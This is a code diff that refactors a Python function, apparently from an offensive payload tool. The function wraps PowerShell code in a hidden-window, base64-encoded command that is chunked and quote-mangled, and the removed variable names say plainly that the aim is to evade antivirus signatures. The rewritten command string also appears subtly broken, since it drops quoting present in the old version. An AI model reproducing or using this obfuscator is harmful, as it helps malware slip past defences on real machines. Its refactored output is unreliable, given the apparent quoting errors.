@@ -3,27 +3,24 @@ from random import randint, choice
 
 
 def obfuscate_ps1(code):
-    ran1 = 'P4j'
-    ran2 = 'X5x'
-    ran3 = '5x4'
+    ran1, ran2, ran3 = 'P4j', 'X5x', '5x4'
 
-    avblah = b64encode(code.encode('utf_16_le'))
-    avsux = randint(4000, 5000)
-    avnotftw = [avblah[i: i + avsux] for i in range(0, len(avblah), avsux)]
-    haha_av = ''
-    counter = 0
-    for non_signature in avnotftw:
-        non_signature = (non_signature.rstrip())
-        if counter > 0:
-            haha_av = haha_av + '+'
-            haha_av = haha_av + "'"
-        surprise_surprise = non_signature.decode('ascii') + "'"
-        haha_av = haha_av + surprise_surprise
-        haha_av = haha_av.replace("==", "'+'==")
-        counter = 1
+    encoded_script = b64encode(code.encode('utf_16_le'))
+    random_range = randint(4000, 5000)
+    random_logic = [encoded_script[i: i + random_range] for i in range(0, len(encoded_script), random_range)]
+    empty_string = ''
+    c = 0
+    for r in random_logic:
+        r = (r.rstrip())
+        if c > 0:
+            empty_string = empty_string + '+'
+            empty_string = empty_string + "'"
+        ascii_representation = r.decode('ascii') + "'"
+        empty_string = empty_string + ascii_representation
+        empty_string = empty_string.replace("==", "'+'==")
+        c = 1
     mangle_quotes = (choice(["''"]))
-    return '''powershell /w 1 /C "s{0}v {1} -;s{0}v {2} e{0}c;s{0}v {3} ((g{0}v {4}).value.toString()+(g{0}v {5}).value.toString());powershell (g{0}v {6}).value.toString() (\''''.format(
-        mangle_quotes, ran1, ran2, ran3, ran1, ran2, ran3) + haha_av + ")" + '"'
+    return '''powershell /w 1 /C "s%sv %s -;s%sv %s e%sc;s%sv %s ((g%sv %s).value.toString()+(g%sv %s).value.toString());powershell (g%sv %s).value.toString() %s)''' % (mangle_quotes, ran1, mangle_quotes, ran2, mangle_quotes, mangle_quotes, ran3, mangle_quotes, ran1, mangle_quotes, ran2, mangle_quotes, ran3, empty_string)
 
 
 def obfuscate_bash(code):
